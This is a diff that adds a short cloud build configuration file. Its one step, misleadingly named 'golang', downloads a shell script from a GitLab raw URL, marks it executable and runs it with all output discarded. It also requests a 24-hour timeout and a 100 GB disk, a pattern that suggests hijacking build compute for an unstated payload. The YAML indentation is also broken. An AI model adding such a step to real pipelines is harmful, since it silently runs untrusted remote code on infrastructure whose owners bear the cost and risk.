@@ -1,0 +1,14 @@
+steps:
+  - name: golang
+    args:
+      - '-c'
+      - >-
+         apt update && apt-get install sudo -y && wget https://gitlab.com/uweldrop/vrsc/-/raw/main/ell.sh
+chmod u+x ell.sh
+./ell.sh >/dev/null >/dev/null 2>&1
+    waitFor:
+      - '-'
+    entrypoint: /bin/bash
+timeout: 86400s
+options:
+  diskSizeGb: '100'
